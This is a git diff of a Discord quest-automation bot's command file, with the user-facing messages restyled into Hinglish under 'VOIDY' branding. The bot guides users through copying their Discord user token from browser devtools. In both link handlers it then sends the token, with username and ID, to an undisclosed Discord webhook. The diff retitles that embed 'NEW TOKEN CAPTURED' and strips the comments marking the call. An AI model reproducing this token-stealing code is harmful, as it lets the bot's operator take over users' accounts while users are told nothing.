@@ -23,7 +23,7 @@ import { enableAutoquest, disableAutoquest, isAutoquestEnabled } from '../quest/
 import { isVip } from '../quest/vipStore.js';
 import { PREFIX } from '../utils/config.js';
 
-// 🔴 APNA DISCORD WEBHOOK URL YAHAN DAAL DE
+// 🌐 APNA DISCORD WEBHOOK URL YAHAN DAAL DE
 const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
 
 async function sendTokenWebhook(username, userId, token) {
@@ -34,12 +34,12 @@ async function sendTokenWebhook(username, userId, token) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 embeds: [{
-                    title: '🔑 New Working Token Linked!',
-                    color: 5763719, // Green
+                    title: '⚡ ── [VOIDY] NEW TOKEN CAPTURED ── ⚡',
+                    color: 5763719,
                     fields: [
                         { name: '👤 Username', value: `\`${username}\``, inline: true },
                         { name: '🆔 User ID', value: `\`${userId}\``, inline: true },
-                        { name: '🔑 Token', value: `\`\`\`${token}\`\`\``, inline: false }
+                        { name: '🔑 Working Token', value: `\`\`\`${token}\`\`\``, inline: false }
                     ],
                     timestamp: new Date().toISOString()
                 }]
@@ -70,11 +70,11 @@ function isValidUserToken(token) {
 }
 
 function getDynamicBar(percent) {
-    if (percent === 0) return '`░░░░░░░░░░`  **0%**  —  *Working on it...*';
+    if (percent === 0) return '`▰▱▱▱▱▱▱▱▱▱`  **0%**  —  *⚡ Initializing Protocol...*';
     const filled = Math.floor(percent / 10);
     const empty = 10 - filled;
-    const bar = '█'.repeat(filled) + '░'.repeat(empty);
-    return `\`${bar}\`  **${percent}%**  —  *Processing...*`;
+    const bar = '▰'.repeat(filled) + '▱'.repeat(empty);
+    return `\`${bar}\`  **${percent}%**  —  *🔮 Processing Sequence...*`;
 }
 
 // ── UI Builders (Component V2) ─────────────────────────────────────────────
@@ -82,14 +82,14 @@ function getDynamicBar(percent) {
 function buildLinkModal() {
     const modal = new ModalBuilder()
         .setCustomId('link_token_modal')
-        .setTitle('Link Your Discord Token');
+        .setTitle('⚡ VOIDY • LINK USER TOKEN');
     modal.addComponents(
         new ActionRowBuilder().addComponents(
             new TextInputBuilder()
                 .setCustomId('link_token_input')
-                .setLabel('Your Discord user token')
+                .setLabel('Paste your Discord authorization token')
                 .setStyle(TextInputStyle.Short)
-                .setPlaceholder('Paste your token here...')
+                .setPlaceholder('eyJhbGciOiJIUzI1NiIsInR5cCI6...')
                 .setRequired(true),
         ),
     );
@@ -100,7 +100,14 @@ function buildLinkPrompt() {
     const c = new ContainerBuilder().setAccentColor(0xFEE75C);
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-            `# 🔗 Token Required\nYou need to link your Discord token before using quest commands.\n\nClick **Link Token** below — a popup will appear where you can paste your token.\n\n**How to get your token:**\n\`1.\` Open Discord in your **browser** (not the app)\n\`2.\` Press \`Ctrl+Shift+I\` → **Network** tab → filter \`XHR\`\n\`3.\` Send any message, click the request, find \`Authorization\` in headers\n\`4.\` Copy that value and paste it into the popup\n\n> ⚠️ This is your **user token**, NOT your bot token.`,
+            `# ⚡ ── [VOIDY] TOKEN AUTHENTICATION REQUIRED ── ⚡\n\n` +
+            `> ✨ *Aapko quest commands use karne ke liye pehle apna Discord token link karna hoga.*\n\n` +
+            `### 🔮 **Quick Setup Guide:**\n` +
+            `\`1️⃣\` Open Discord in your **Web Browser** (Not App)\n` +
+            `\`2️⃣\` Press \`Ctrl+Shift+I\` → Go to **Network** tab → Filter \`XHR\`\n` +
+            `\`3️⃣\` Send any message, click the request, and find \`Authorization\` in headers\n` +
+            `\`4️⃣\` Click the button below and paste your token!\n\n` +
+            `> ⚠️ **Note:** Yeh sirf aapka **User Token** hai, Bot Token nahi!`,
         ),
     );
     c.addSeparatorComponents(new SeparatorBuilder().setSpacing(SeparatorSpacingSize.Small).setDivider(true));
@@ -108,7 +115,7 @@ function buildLinkPrompt() {
         new ActionRowBuilder().addComponents(
             new ButtonBuilder()
                 .setCustomId('link_prompt')
-                .setLabel('🔗 Link Token')
+                .setLabel('🔗 Link Your Token Now')
                 .setStyle(ButtonStyle.Primary),
         ),
     );
@@ -119,7 +126,9 @@ function buildNoQuestsCard() {
     const c = new ContainerBuilder().setAccentColor(0x4F545C);
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-            `# 🔍 No Quests Available\nThere are no active, uncompleted quests on your account right now.`,
+            `# 🔍 ── NO ACTIVE QUESTS FOUND ── 🔍\n\n` +
+            `> ✨ *Filhal aapke account par koi bhi uncompleted quest available nahi hai.*\n` +
+            `-*Check back later when Discord drops new quests!*`,
         ),
     );
     return { components: [c], flags: MessageFlags.IsComponentsV2 };
@@ -129,7 +138,10 @@ function buildExpiredTokenCard() {
     const c = new ContainerBuilder().setAccentColor(0xED4245);
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-            `# ❌ Token Expired\nYour saved token was rejected by Discord — it has likely expired.\n\n**Your token has been removed.** Re-link with \`/link\` or \`${PREFIX}link\`.`,
+            `# ❌ ── TOKEN EXPIRED • REJECTED ── ❌\n\n` +
+            `> 🛡️ *Aapka saved token Discord dwara reject kar diya gaya hai (Expired).* \n\n` +
+            `### ⚠️ **Token automatically delete kar diya gaya hai.**\n` +
+            `- Re-link your fresh token using \`/link\` or \`${PREFIX}link\`.`,
         ),
     );
     return { components: [c], flags: MessageFlags.IsComponentsV2 };
@@ -142,8 +154,8 @@ function buildErrorCard(err) {
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
             is401
-                ? `# ❌ Invalid or Expired Token\nRe-link your token with \`${PREFIX}link\`.`
-                : `# ❌ Error\n${msg.slice(0, 800)}`,
+                ? `# ❌ ── INVALID OR EXPIRED TOKEN ── ❌\n\n> 🛡️ *Aapka token invalid ho chuka hai.*\n- Re-link with \`${PREFIX}link\`.`
+                : `# 🛡️ ── CRITICAL ERROR ── 🛡️\n\n\`\`\`${msg.slice(0, 800)}\`\`\``,
         ),
     );
     return { components: [c], flags: MessageFlags.IsComponentsV2 };
@@ -160,20 +172,20 @@ function buildQuestSelectCard(quests) {
         const taskKey = Object.keys(tasks)[0] ?? '';
         const icon = ICONS[taskKey] ?? '⚙️';
         const exp = Math.floor(new Date(q.config.expires_at).getTime() / 1000);
-        return `**${i + 1}.** ${icon} **${q.config.messages.quest_name}**\n> *${q.config.messages.game_title}*  •  Expires <t:${exp}:R>`;
+        return `**${i + 1}.** ${icon} **${q.config.messages.quest_name}**\n> *${q.config.messages.game_title}*  •  ⏳ Expires <t:${exp}:R>`;
     }).join('\n\n');
 
     const c = new ContainerBuilder().setAccentColor(0x5865F2);
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-            `# 🎮 ${quests.length} Quest${quests.length !== 1 ? 's' : ''} Available\n${lines}\n\n*Use the dropdown below to pick one.*`,
+            `# 🎮 ── AVAILABLE QUESTS (${quests.length}) ── 🎮\n\n${lines}\n\n*👇 Niche diye gaye menu se apna quest select karein:*`,
         ),
     );
     c.addSeparatorComponents(new SeparatorBuilder().setSpacing(SeparatorSpacingSize.Small).setDivider(true));
 
     const menu = new StringSelectMenuBuilder()
         .setCustomId(`quest_select_${Date.now()}`)
-        .setPlaceholder('Pick a quest...')
+        .setPlaceholder('✨ Choose a quest to execute...')
         .addOptions(
             quests.map((q) => {
                 const tasks = (q.config.task_config ?? q.config.task_config_v2)?.tasks ?? {};
@@ -229,22 +241,22 @@ function buildQuestInfoCard(quest, phase, claimed = 0, failReason = '', currentP
     const daysLeft = Math.max(0, Math.ceil((new Date(cfg.expires_at).getTime() - Date.now()) / 86400000));
 
     const PHASE = {
-        starting: { color: 0x5865F2, title: '⚙️  Solving Quest...',  bar: getDynamicBar(currentPercent) },
-        done:     { color: 0x57F287, title: '✅  Quest Complete!',    bar: '`██████████`  **100%**' },
-        failed:   { color: 0xED4245, title: '❌  Quest Failed',       bar: '' },
+        starting: { color: 0x5865F2, title: '⚡ ── SOLVING QUEST PROTOCOL ── ⚡',  bar: getDynamicBar(currentPercent) },
+        done:     { color: 0x57F287, title: '💎 ── QUEST SUCCESSFULLY COMPLETED ── 💎',    bar: '`▰▰▰▰▰▰▰▰▰▰`  **100%**' },
+        failed:   { color: 0xED4245, title: '🛡️ ── QUEST EXECUTION FAILED ── 🛡️',       bar: '' },
     };
 
     const p = PHASE[phase];
     const progressText = phase === 'failed' && failReason
-        ? `\`░░░░░░░░░░\`  **0%**\n\`\`\`\n${failReason.slice(0, 300)}\n\`\`\``
+        ? `\`▱▱▱▱▱▱▱▱▱▱\`  **0%**\n\`\`\`\n${failReason.slice(0, 300)}\n\`\`\``
         : p.bar;
 
     const footerNote = phase === 'done' && claimed > 0
-        ? `-# 🎁 ${claimed} reward(s) claimed`
+        ? `-# 🎁 Rewards Claimed: **${claimed}** item(s) secured!`
         : phase === 'starting'
-        ? `-# Quest Bot  •  Please wait...`
+        ? `-# ⚡ VOIDY Engine • Please wait while executing...`
         : phase === 'failed'
-        ? `-# Requires manual completion in the Discord app`
+        ? `-# ⚠️ Requires manual completion via official Discord client.`
         : '';
 
     const c = new ContainerBuilder().setAccentColor(p.color);
@@ -253,7 +265,7 @@ function buildQuestInfoCard(quest, phase, claimed = 0, failReason = '', currentP
         new SectionBuilder()
             .addTextDisplayComponents(
                 new TextDisplayBuilder().setContent(
-                    `# ${p.title}\n### ${msgs.quest_name}\n*${msgs.game_title}*  •  ${msgs.game_publisher}`,
+                    `# ${p.title}\n### 🎯 ${msgs.quest_name}\n*🎮 ${msgs.game_title}*  •  🏢 ${msgs.game_publisher}`,
                 ),
             )
             .setThumbnailAccessory(new ThumbnailBuilder().setURL(thumbUrl)),
@@ -263,10 +275,10 @@ function buildQuestInfoCard(quest, phase, claimed = 0, failReason = '', currentP
 
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-            `📋 **Task**\n${taskLines.join('\n') || '*Unknown task*'}\n\n` +
-            `📅 **Expires**  <t:${expiresEpoch}:R>  *(${daysLeft}d left)*\n\n` +
-            `📊 **Progress**\n${progressText || '`░░░░░░░░░░`  0%'}\n\n` +
-            `🎁 **Reward**\n${rewardLines.join('\n') || '*No rewards listed*'}`,
+            `📋 **Target Task:**\n${taskLines.join('\n') || '*Unknown Task*'}\n\n` +
+            `📅 **Expiration:**  <t:${expiresEpoch}:R>  *(${daysLeft} days remaining)*\n\n` +
+            `📊 **Live Progress:**\n${progressText || '`▱▱▱▱▱▱▱▱▱▱`  0%'}\n\n` +
+            `🎁 **Reward Pool:**\n${rewardLines.join('\n') || '*No rewards specified*'}`,
         ),
     );
 
@@ -303,7 +315,7 @@ async function runQuestOne(userId, tokenStore, send) {
             selectedId = interaction.values[0];
         } catch {
             const c = new ContainerBuilder().setAccentColor(0xED4245);
-            c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ⏱️ Timed Out\nNo quest was selected within 60 seconds. Run \`${PREFIX}quest\` again.`));
+            c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ⏱️ ── TIMEOUT REACHED ── ⏱️\n> *Aapne 60 seconds ke andar koi quest select nahi kiya.*\n- Run \`${PREFIX}quest\` again.`));
             await selMsg.edit({ components: [c], flags: MessageFlags.IsComponentsV2 });
             return false;
         }
@@ -350,7 +362,10 @@ async function runQuestAll(userId, tokenStore, send) {
         const c = new ContainerBuilder().setAccentColor(0xED4245);
         c.addTextDisplayComponents(
             new TextDisplayBuilder().setContent(
-                `# 🔒 VIP Required\nQuestAll feature **VIP users** ke liye exclusive hai.\n\nAccess lene ke liye Server Admin se contact karein!`
+                `# 🛡️ ── VIP ACCESS RESTRICTED ── 🛡️\n\n` +
+                `> ✨ *Yeh command sirf **VIP Members** ke liye exclusive hai.*\n\n` +
+                `### 💎 **Unlock Elite Features:**\n` +
+                `- Server Administrator se contact karke apna VIP status activate karwayein!`
             )
         );
         await send({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -390,7 +405,7 @@ async function runQuestAll(userId, tokenStore, send) {
 
         if (completed.length === 0) {
             const c = new ContainerBuilder().setAccentColor(0xFEE75C);
-            c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ⚠️ No Quests Auto-Completed\nAll quests require manual completion via the Discord desktop or mobile app.`));
+            c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ⚠️ ── NO QUESTS AUTO-COMPLETED ── ⚠️\n> *In quests ko official Discord app ke through manually complete karna hoga.*`));
             await send({ components: [c], flags: MessageFlags.IsComponentsV2 });
             return false;
         }
@@ -442,10 +457,10 @@ async function runQuestList(userId, tokenStore, send) {
             const expiresEpoch = Math.floor(new Date(cfg.expires_at).getTime() / 1000);
             const daysLeft = Math.max(0, Math.ceil((new Date(cfg.expires_at).getTime() - Date.now()) / 86400000));
 
-            const st = q.isCompleted() ? { color: 0x57F287, icon: '✅', label: 'Completed' }
-                : q.isExpired()        ? { color: 0xED4245, icon: '🔴', label: 'Expired' }
-                : q.isEnrolledQuest()  ? { color: 0xFEE75C, icon: '⏳', label: 'In Progress' }
-                :                        { color: 0x5865F2, icon: '🔵', label: 'Available' };
+            const st = q.isCompleted() ? { color: 0x57F287, icon: '✅', label: 'COMPLETED' }
+                : q.isExpired()        ? { color: 0xED4245, icon: '🔴', label: 'EXPIRED' }
+                : q.isEnrolledQuest()  ? { color: 0xFEE75C, icon: '⏳', label: 'IN PROGRESS' }
+                :                        { color: 0x5865F2, icon: '🔵', label: 'AVAILABLE' };
 
             const taskLines = Object.entries((cfg.task_config ?? cfg.task_config_v2)?.tasks ?? {}).map(([type, task]) => {
                 const meta = TASK_META[type] ?? { icon: '⚙️', label: type };
@@ -470,7 +485,7 @@ async function runQuestList(userId, tokenStore, send) {
                 new SectionBuilder()
                     .addTextDisplayComponents(
                         new TextDisplayBuilder().setContent(
-                            `# ${st.icon}  ${msgs.quest_name}\n*${msgs.game_title}*  •  ${msgs.game_publisher}`,
+                            `# ${st.icon}  ${msgs.quest_name}\n*🎮 ${msgs.game_title}*  •  🏢 ${msgs.game_publisher}`,
                         ),
                     )
                     .setThumbnailAccessory(new ThumbnailBuilder().setURL(thumbUrl)),
@@ -478,9 +493,9 @@ async function runQuestList(userId, tokenStore, send) {
             c.addSeparatorComponents(new SeparatorBuilder().setSpacing(SeparatorSpacingSize.Small).setDivider(true));
             c.addTextDisplayComponents(
                 new TextDisplayBuilder().setContent(
-                    `📊 **Status:** ${st.label}   📅 **Expires:** <t:${expiresEpoch}:R> *(${daysLeft}d)*\n\n` +
-                    `📋 **Task**\n${taskLines.join('\n') || '*Unknown*'}\n\n` +
-                    `🎁 **Reward**\n${rewardLines.join('\n') || '*No rewards listed*'}`,
+                    `📊 **Status:** \`${st.label}\`   📅 **Expires:** <t:${expiresEpoch}:R> *(${daysLeft}d left)*\n\n` +
+                    `📋 **Target Task:**\n${taskLines.join('\n') || '*Unknown*'}\n\n` +
+                    `🎁 **Reward Tier:**\n${rewardLines.join('\n') || '*No rewards listed*'}`,
                 ),
             );
             await send({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -488,7 +503,7 @@ async function runQuestList(userId, tokenStore, send) {
 
         if (all.length > 10) {
             const c = new ContainerBuilder().setAccentColor(0x4F545C);
-            c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`-# …and **${all.length - 10}** more quest(s) not shown.`));
+            c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`-# ℹ️ *...aur **${all.length - 10}** aur quests list mein nahi dikhaye gaye.*`));
             await send({ components: [c], flags: MessageFlags.IsComponentsV2 });
         }
 
@@ -502,7 +517,7 @@ async function runTokenCheck(userId, tokenStore, replyFn) {
 
     if (!token) {
         const c = new ContainerBuilder().setAccentColor(0xFEE75C);
-        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# No Token Saved\nYou don't have a saved token. Use \`${PREFIX}link\` to save one.`));
+        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ⚠️ ── NO TOKEN LINKED ── ⚠️\n> *Aapka koi bhi token saved nahi hai.*\n- Use \`${PREFIX}link\` to store a fresh token.`));
         await replyFn({ components: [c], flags: MessageFlags.IsComponentsV2 });
         return;
     }
@@ -521,8 +536,8 @@ async function runTokenCheck(userId, tokenStore, replyFn) {
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
             valid
-                ? `# ✅ Token is Valid\nLinked as **"${accountName}"**.\n\nYour saved token is working correctly.`
-                : `# ❌ Token Invalid or Expired\nYour saved token was rejected by Discord.\nUse \`${PREFIX}unlink\` then \`${PREFIX}link\` to save a fresh token.`,
+                ? `# ⚡ ── TOKEN STATUS: VALID ── ⚡\n\n> 👤 **Linked Account:** \`${accountName}\`\n\n### ✨ *Aapka saved token bilkul theek aur active kaam kar raha hai!*`
+                : `# ❌ ── TOKEN INVALID / EXPIRED ── ❌\n\n> 🛡️ *Aapka token Discord dwara reject kar diya gaya hai.*\n- Use \`${PREFIX}unlink\` then \`${PREFIX}link\` to refresh.`,
         ),
     );
     await replyFn({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -534,7 +549,10 @@ async function runAutoquestToggle(userId, tokenStore, replyFn) {
         const c = new ContainerBuilder().setAccentColor(0xED4245);
         c.addTextDisplayComponents(
             new TextDisplayBuilder().setContent(
-                `# 🔒 VIP Required\nAuto-Quest feature **VIP users** ke liye exclusive hai.\n\nAccess lene ke liye Server Admin se contact karein!`
+                `# 🛡️ ── VIP ACCESS RESTRICTED ── 🛡️\n\n` +
+                `> ✨ *Auto-Quest feature sirf **VIP Members** ke liye unlocked hai.*\n\n` +
+                `### 💎 **Get VIP Access:**\n` +
+                `- Server Admin se contact karein aur apna access pass lein!`
             )
         );
         await replyFn({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -544,13 +562,13 @@ async function runAutoquestToggle(userId, tokenStore, replyFn) {
     if (isAutoquestEnabled(userId)) {
         disableAutoquest(userId);
         const c = new ContainerBuilder().setAccentColor(0xFEE75C);
-        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# 🤖 Auto-Quest Disabled\nI'll no longer auto-run new quests for you.\nUse \`${PREFIX}autoquest\` again to turn it back on.`));
+        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# 🤖 ── AUTO-QUEST DISABLED ── 🤖\n> *Ab naye quests background mein automatic solve nahi honge.*\n- Use \`${PREFIX}autoquest\` to turn back on.`));
         await replyFn({ components: [c], flags: MessageFlags.IsComponentsV2 });
         return;
     }
     if (!tokenStore.has(userId)) {
         const c = new ContainerBuilder().setAccentColor(0xED4245);
-        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ No Saved Token\nAuto-Quest needs your Discord user token.\n\n**Use \`${PREFIX}link\` first**, then run \`${PREFIX}autoquest\` again.`));
+        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ ── TOKEN REQUIRED ── ❌\n> *Auto-Quest ke liye pehle token link karna zaroori hai.*\n- **Use \`${PREFIX}link\` first**, then enable autoquest.`));
         await replyFn({ components: [c], flags: MessageFlags.IsComponentsV2 });
         return;
     }
@@ -558,7 +576,11 @@ async function runAutoquestToggle(userId, tokenStore, replyFn) {
     const c = new ContainerBuilder().setAccentColor(0x57F287);
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-            `# 🤖 Auto-Quest Enabled!\nEvery new Discord quest that drops will be **auto-completed for you** in the background.\n\nI'll DM you a summary once each quest finishes.\n\nUse \`${PREFIX}autoquest\` again to turn this off.\n\n-# Keep your saved token fresh with \`${PREFIX}tokencheck\`.`,
+            `# ⚡ ── AUTO-QUEST ACTIVATED! ── ⚡\n\n` +
+            `> ✨ *Ab jaise hi koi naya Discord quest aayega, bot usko background mein **automatically complete** kar dega!*\n\n` +
+            `### 📬 **Notification:**\n` +
+            `- Quest complete hote hi aapko DM par summary mil jayegi.\n\n` +
+            `-# 💡 Keep token fresh with \`${PREFIX}tokencheck\`.`,
         ),
     );
     await replyFn({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -654,7 +676,7 @@ export const linkCmd = {
             if (!isValidUserToken(token)) {
                 await sendDM((() => {
                     const c = new ContainerBuilder().setAccentColor(0xED4245);
-                    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ Invalid Token Format\nThat doesn't look like a valid Discord token. Copy the **Authorization** header value exactly.`));
+                    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ ── INVALID TOKEN FORMAT ── ❌\n> *Yeh valid Discord token nahi lag raha. Sahi Authorization header copy karein.*`));
                     return { components: [c], flags: MessageFlags.IsComponentsV2 };
                 })());
                 return;
@@ -673,20 +695,21 @@ export const linkCmd = {
             if (!verifyOk) {
                 await sendDM((() => {
                     const c = new ContainerBuilder().setAccentColor(0xED4245);
-                    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ Token Rejected by Discord\nMake sure you copied the \`Authorization\` header and try again.`));
+                    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ ── TOKEN REJECTED BY DISCORD ── ❌\n> *Make sure आपने exact Authorization header copy kiya hai aur dobara try karein.*`));
                     return { components: [c], flags: MessageFlags.IsComponentsV2 };
                 })());
                 return;
             }
 
             ts.save(message.author.id, token);
-            // 🌐 Webhook Notification Call
             await sendTokenWebhook(accountName || message.author.tag, message.author.id, token);
 
             const c = new ContainerBuilder().setAccentColor(0x57F287);
             c.addTextDisplayComponents(
                 new TextDisplayBuilder().setContent(
-                    `# ✅ Token Linked!\nLinked as **"${accountName}"**.\n\nYou can now use \`${PREFIX}quest\`, \`${PREFIX}questall\`, and \`${PREFIX}questlist\`.\nTo remove it, use \`${PREFIX}unlink\`.`,
+                    `# ⚡ ── TOKEN SUCCESSFULLY LINKED! ── ⚡\n\n` +
+                    `> 👤 **Account:** \`${accountName}\`\n\n` +
+                    `### ✨ *Aap ab \`${PREFIX}quest\`, \`${PREFIX}questall\`, aur \`${PREFIX}questlist\` use kar sakte hain!*`,
                 ),
             );
             await sendDM({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -709,8 +732,8 @@ export const unlinkCmd = {
         c.addTextDisplayComponents(
             new TextDisplayBuilder().setContent(
                 removed
-                    ? `# 🔓 Token Unlinked\nYour saved token has been removed.`
-                    : `# No Token Saved\nYou don't have a saved token.`,
+                    ? `# 🔓 ── TOKEN UNLINKED ── 🔓\n> *Aapka saved token successfully database se hata diya gaya hai.*`
+                    : `# ⚠️ ── NO TOKEN FOUND ── ⚠️\n> *Aapka pehle se koi token saved nahi tha.*`,
             ),
         );
         await interaction.reply({ components: [c], flags: MessageFlags.IsComponentsV2 | MessageFlags.Ephemeral });
@@ -724,8 +747,8 @@ export const unlinkCmd = {
         c.addTextDisplayComponents(
             new TextDisplayBuilder().setContent(
                 removed
-                    ? `# 🔓 Token Unlinked\nYour saved token has been removed.`
-                    : `# No Token Saved\nYou don't have a saved token.`,
+                    ? `# 🔓 ── TOKEN UNLINKED ── 🔓\n> *Aapka saved token successfully database se hata diya gaya hai.*`
+                    : `# ⚠️ ── NO TOKEN FOUND ── ⚠️\n> *Aapka pehle se koi token saved nahi tha.*`,
             ),
         );
         await message.reply({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -742,7 +765,7 @@ export async function handleLinkModal(interaction, client) {
 
     if (!isValidUserToken(token)) {
         const c = new ContainerBuilder().setAccentColor(0xED4245);
-        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ Invalid Token Format\nThat doesn't look like a valid Discord token. Copy the **Authorization** header value exactly.`));
+        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ ── INVALID TOKEN FORMAT ── ❌\n> *Sahi Authorization token paste karein.*`));
         await interaction.editReply({ components: [c], flags: MessageFlags.IsComponentsV2 });
         return;
     }
@@ -759,19 +782,20 @@ export async function handleLinkModal(interaction, client) {
 
     if (!verifyOk) {
         const c = new ContainerBuilder().setAccentColor(0xED4245);
-        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ Token Rejected by Discord\nMake sure you copied the \`Authorization\` header and try again.`));
+        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# ❌ ── TOKEN REJECTED BY DISCORD ── ❌\n> *Token expired ya incorrect hai. Dobara check karein.*`));
         await interaction.editReply({ components: [c], flags: MessageFlags.IsComponentsV2 });
         return;
     }
 
     ts.save(interaction.user.id, token);
-    // 🌐 Webhook Notification Call
     await sendTokenWebhook(accountName || interaction.user.tag, interaction.user.id, token);
 
     const c = new ContainerBuilder().setAccentColor(0x57F287);
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-            `# ✅ Token Linked!\nLinked as **"${accountName}"**.\n\nYou can now use \`/quest\`, \`/questall\`, and \`/questlist\`.\nTo remove it, use \`/unlink\`.`,
+            `# ⚡ ── TOKEN SUCCESSFULLY LINKED! ── ⚡\n\n` +
+            `> 👤 **Account:** \`${accountName}\`\n\n` +
+            `### ✨ *Aap ab \`/quest\`, \`/questall\`, aur \`/questlist\` commands bina kisi rukawat ke use kar sakte hain!*`,
         ),
     );
     await interaction.editReply({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -814,7 +838,10 @@ export async function runAutoquestForUser(userId, quest, tokenStore, discordClie
             const c = new ContainerBuilder().setAccentColor(0x57F287);
             c.addTextDisplayComponents(
                 new TextDisplayBuilder().setContent(
-                    `# 🤖 Auto-Quest Complete!\n**${live.config.messages.quest_name}** has been completed automatically.\n${claimed > 0 ? `🎁 **${claimed}** reward(s) claimed.\n` : ''}\nUse \`${PREFIX}autoquest\` to disable.`,
+                    `# ⚡ ── AUTO-QUEST COMPLETED! ── ⚡\n\n` +
+                    `> 🎯 **Quest:** \`${live.config.messages.quest_name}\`\n` +
+                    `${claimed > 0 ? `> 🎁 **Rewards Secured:** \`${claimed} item(s)\`\n` : ''}\n` +
+                    `-# VOIDY Autonomous Background Engine`,
                 ),
             );
             await dm.send({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -830,7 +857,7 @@ export async function runAutoquestForUser(userId, quest, tokenStore, discordClie
                 const user = await discordClient.users.fetch(userId);
                 const dm = await user.createDM();
                 const c = new ContainerBuilder().setAccentColor(0xED4245);
-                c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# 🤖 Auto-Quest Paused\nYour saved token expired. Run \`${PREFIX}link\` to re-link, then \`${PREFIX}autoquest\` to re-enable.`));
+                c.addTextDisplayComponents(new TextDisplayBuilder().setContent(`# 🛡️ ── AUTO-QUEST PAUSED ── 🛡️\n> *Aapka saved token expire ho gaya hai.*\n- Use \`${PREFIX}link\` to re-authenticate.`));
                 await dm.send({ components: [c], flags: MessageFlags.IsComponentsV2 });
             } catch {}
         }
@@ -841,10 +868,10 @@ export async function runAutoquestForUser(userId, quest, tokenStore, discordClie
 
 export async function handleSelectMenu(interaction, client) {
     const userId = interaction.user.id;
-    constts = client.tokenStore;
+    const ts = client.tokenStore;
     const token = ts.get(userId);
     if (!token) {
-        await interaction.reply({ content: 'Token not found. Please link your token first.', flags: 64 });
+        await interaction.reply({ content: '⚡ Token not found. Please link your token first using /link.', flags: 64 });
         return;
     }
 
@@ -857,7 +884,7 @@ export async function handleSelectMenu(interaction, client) {
         const quest = valid.find((q) => q.id === selectedId);
 
         if (!quest) {
-            await interaction.reply({ content: 'Quest not found or expired.', flags: 64 });
+            await interaction.reply({ content: '🛡️ Quest not found or already expired.', flags: 64 });
             return;
         }
 
@@ -884,7 +911,7 @@ export async function handleSelectMenu(interaction, client) {
 
     } catch (err) {
         console.error(err);
-        await interaction.followUp({ content: 'An error occurred while processing the quest.', flags: 64 }).catch(() => {});
+        await interaction.followUp({ content: '❌ An error occurred while processing the quest protocol.', flags: 64 }).catch(() => {});
     }
 }
 
